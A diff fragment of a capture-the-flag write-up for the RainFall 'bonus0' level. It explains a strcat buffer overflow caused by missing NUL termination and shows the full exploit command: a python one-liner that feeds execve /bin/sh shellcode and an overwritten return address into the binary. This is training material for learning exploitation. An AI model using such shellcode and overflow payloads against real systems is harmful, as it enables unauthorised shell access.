@@ -46,13 +46,9 @@
 ### Explanation
 
 The vulnerability in the binary comes from the lack of `NULL` terminated character when managing input buffers. 
-
 The function `p()` reads data from stdin into a buffer using `read()` without checking its inputs length. 
-
 The first 20 bytes are copied into the buffer however no NULL characters are set into the buffer if the size of the input is equal or greater than 20.
-
 Next the `pp()` function concatenates both buffers using `strcat()` but since the first buffer is not NULL terminated, `strcat()` will continue to read memory past `buff_arg1`, causing the buffer overflow.
-
 To proceed, we are first going to fill the first buffer with 20 characters 'A' followed by the shellcode.
 
 ```bash
@@ -74,6 +70,7 @@ python -c 'print(("B" * 9) + "\xbf\xff\xe6\x94"[::-1] + "CCCCCCC")'
 ```
 
 ## Step 2: Exploiting the Binary
+
 ```bash
 bonus0@RainFall:~$ (python -c 'print(("A" * 20) + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")' ; python -c 'print(("B" * 9) + "\xbf\xff\xe6\x94"[::-1] + "CCCCCCC")' ; cat) | /home/user/bonus0/bonus0
 
